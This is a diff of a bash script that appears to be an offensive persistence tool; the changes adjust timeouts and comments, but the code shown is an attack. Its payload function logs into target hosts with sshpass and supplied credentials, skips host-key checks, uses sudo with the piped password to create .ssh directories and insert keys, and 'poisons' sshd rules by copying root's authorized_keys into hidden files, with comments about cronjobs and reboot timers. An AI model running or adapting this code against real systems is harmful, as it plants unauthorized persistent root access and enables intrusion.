@@ -30,9 +30,9 @@
 	# make rickroll "safer"
 	# faster timeouts
 	# fix file checking
+	# setup aafire (aalib)
 	### add the rest of it to Debian/Ubuntu
 	# fix the $? in the if statements, they wont work right
-
 	#******************************************************
 	#
 #///////////////////////////////////////////////////////////////////////////////////////
@@ -144,8 +144,9 @@ function payload(){			#
 		password="$(echo $tango | cut -d" " -f3 || $3)"
 			: ${password:=$3}
 	# ssh commands
-		sshLoginCommand="timeout 1 sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target"
-		sshKeydCommand="timeout 1 ssh -n $target"
+		#do NOT add -n to this one
+		sshLoginCommand="timeout 1.5 sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target"
+		sshKeydCommand="timeout 1.5 ssh -n $target"
 	# ssh paths
 		sshUserPath="/home/$username/.ssh"
 		sshUserKey="$sshUserPath/authorized_keys"
@@ -157,7 +158,7 @@ function payload(){			#
 		sshContinue=0
 
 #### Inserting keys ############################
-		osDetect=$(timeout 1 sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target 'uname -v | egrep -o "Debian|Ubuntu" || cat /etc/*-release | grep -o CentOS | sort -u')
+		osDetect=$(timeout 1.5 sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target 'uname -v | egrep -o "Debian|Ubuntu" || cat /etc/*-release | grep -o CentOS | sort -u')
 			if [[ $? == 0 ]]; then
 				printf "\n[$target] Inserting ssh key and poisoning dirs with (\e[0;33m${username}\e[m:\e[0;33m${password}\e[m)"
 			else
@@ -168,7 +169,7 @@ function payload(){			#
 			case $osDetect in
 				CentOS)
 						#inserting key
-							if ! timeout 1 ssh -n -o StrictHostKeyChecking=no $target; then
+							if ! timeout 1.5 ssh -n -o StrictHostKeyChecking=no $target; then
 								$sshLoginCommand "
 												echo $password | sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &> /dev/null
 												echo $password | sudo -S chown $username:$username $sshUserPath &> /dev/null
@@ -191,7 +192,7 @@ function payload(){			#
 							fi
 						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
 							if [ $sshContinue == 0 ]; then
-								printf "\n[$target] Poisoning sshd rules"
+								printf "[$target] Poisoning sshd rules"
 								$sshKeydCommand "
 											mkdir $sshPoisonPath
 											cp $sshRootKey /root/.ssh/.authorized_keys
